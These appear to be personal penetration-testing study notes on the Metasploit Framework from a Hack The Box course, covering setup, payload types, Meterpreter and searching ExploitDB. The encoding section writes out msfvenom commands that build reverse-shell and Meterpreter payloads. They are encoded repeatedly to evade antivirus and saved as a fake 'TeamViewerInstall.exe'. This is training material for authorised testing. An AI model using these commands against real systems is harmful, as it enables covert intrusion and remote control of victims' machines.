Using the Metasploit Framework
################################

Date: 2024-11-06 08:57

Status:

Tags: #pentesting

Description
*************

Metasploit comes in a free opensource, and pro version. \* Opensource
version uses the CLI msfconsole \* Pro has a GUI and more goodies

Architecture
**************

Can be installed with:

.. code-block:: console

   Temen@htb[/htb]$ sudo apt update && sudo apt install metasploit-framework

Plugins can be found:

.. code-block:: console

   Temen@htb[/htb]$ ls /usr/share/metasploit-framework/plugins/

Scripts can be found:

.. code-block:: console

   Temen@htb[/htb]$ ls /usr/share/metasploit-framework/scripts/

Tools can be found:

.. code-block:: console

   Temen@htb[/htb]$ ls /usr/share/metasploit-framework/tools/

Typical workflow
******************

1. Enumeration
2. Preparation
3. Exploitation
4. Privilege Escalation
5. Post Exploitation

Payloads
***************

stager, stages and staged payloads
=====================================

1. **Stagers** payloads work with stage payloads to perform a specific
   task. Stagers normally setup the task (setup a shell)
2. **Stages** are payload components that are downloaded by the Stager
   payloads
3. **Staged** payloads are simply the exploitation process.

inspection:

.. code-block:: console

   msf6 > grep meterpreter show payloads 

   <SNIP>

   535  windows/x64/meterpreter/bind_ipv6_tcp                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   <SNIP>

Meterpreter Payload
=====================

The ``Meterpreter`` payload is a specific type of multi-faceted payload
that uses ``DLL injection`` This creates a persistent connection where
you can load and unload scripts and plugins.

Encoding
=============

Using msfvenom and msfpayload/msfencodewe can create encoded
payloads/scripts/programs for different architecture to circumvent
IPS/Scanners and virus.

**Examples**:

Example 1: using :ref:`msfvenom <msfvenom>` (without encoding)

.. code-block:: console


   Temen@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl

Example 2: (with
https://academy.hackthebox.com/module/39/section/418

.. code-block:: console

   Temen@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

Example 3: using msfpayload (used prior to 2015)

.. code-block:: console

   Temen@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai

Example 4: Running the
encoder <https://academy.hackthebox.com/module/39/section/418> on a
payload with 10 interations to avoid malware detection

.. code-block:: console

   Temen@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe

Checking Payloads against Virus databases
===========================================

This service requires a subscription and API key

Example:

.. code-block:: console

   msf-virustotal -k <API key> -f TeamViewerInstall.exe

Loading Plugins
=================

Plugins can be copied to the plugins directory and loaded in msfconsole
with ``load <plugin-name>``

Adding custom plugins
**********************

ExploitDB
===========

There is a list of exploits in the exploit database at
ExploitDB https://www.exploit-db.com/ If you filter for the tag
Metasploit Framework (MSF) https://www.exploit-db.com/?tag=3 you
will get a list of scripts that can be added to your Metasploit plugin
directory.

Searching for custom plugins
==============================

There is a tool called ``searchsploit`` that can search the ExploitDB
from the command line. Example:

.. code-block:: console

   Temen@htb[/htb]$ searchsploit nagios3

   --------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
    Exploit Title                                                                                                                               |  Path
   --------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
   Nagios3 - 'history.cgi' Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb
   Nagios3 - 'history.cgi' Remote Command Execution                                                                                             | multiple/remote/24084.py
   Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb
   Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb
   --------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
   Shellcodes: No Results

Only scripts that are .rb (ruby are compatible with msfconsole)

References
***************
**Plugins** https://github.com/darkoperator/Metasploit-Plugins
https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation
https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb
